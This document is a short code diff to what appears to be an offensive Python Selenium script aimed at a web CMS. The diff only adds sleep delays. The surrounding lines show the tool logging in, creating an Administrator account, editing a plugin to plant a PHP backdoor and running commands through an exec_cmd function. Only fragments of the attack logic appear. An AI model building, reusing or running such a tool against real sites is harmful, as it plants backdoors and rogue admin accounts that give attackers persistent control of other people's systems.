@@ -9,6 +9,7 @@ from bs4 import BeautifulSoup
 import urllib.parse
 import argparse, logging, sys
 import base64
+from time import sleep
 
 FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
 EDIT_PLUGIN_URL:str #URL to currently working plugin for php backdoor
@@ -18,6 +19,7 @@ def load_element(e_name, e_type='ID', timeout=5):
     It checks whether the specified ID, NAME or CLASS_NAME elements are loaded on the current page.
     The timeout specifies how long to wait before the script terminates
     '''
+    sleep(2)
     try: 
         if e_type == 'ID':
             element_present = EC.presence_of_element_located((By.ID, e_name))
@@ -84,6 +86,7 @@ def crate_user():
         load_element('role')
         driver.find_element_by_id('role').send_keys('Administrator')
         # click create user button 
+        sleep(5)
         load_element('createusersub')
         driver.find_element_by_id('createusersub').click()
     except Exception as e:
@@ -254,6 +257,7 @@ def exec_cmd(p_name, f_name, p_orginal):
             print(f'Comamnd Execution ERROR : {e}')
 
 def main():
+    sleep(5)
     print("\n| Start Selenium Script")
     login(args.user, args.password)
     # check if user have admin righs (default config: only admins can edit plugins or create users)
